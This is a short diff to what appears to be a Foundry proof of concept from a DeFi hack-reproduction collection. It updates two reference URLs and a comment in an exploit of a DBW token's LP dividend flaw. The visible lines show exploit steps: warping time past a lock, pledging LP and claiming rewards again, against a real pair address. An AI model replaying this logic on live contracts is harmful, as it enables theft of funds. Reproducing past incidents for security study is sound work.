@@ -13,8 +13,8 @@ import "./interface.sol";
 // The root cause is that the dividend awards are based on the percentage of LP currently owned by the user,
 // and does not take into account multiple dividends after the transfer of LP.
 // @Similar events
-// https://github.com/zhouxianyuan/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw
-// https://github.com/zhouxianyuan/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation
+// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw
+// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation
 
 interface IDBW is IERC20 {
     function pledge_lp(uint256 count) external;
@@ -169,7 +169,7 @@ contract claimRewardImpl is Test {
         Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
         Pair.approve(address(DBW), type(uint256).max);
         DBW.getStaticIncome();
-        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // time Limit
+        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit
         uint256 LPAmount = Pair.balanceOf(address(this));
         DBW.pledge_lp(LPAmount); // send LP
         DBW.getStaticIncome(); // claim reward
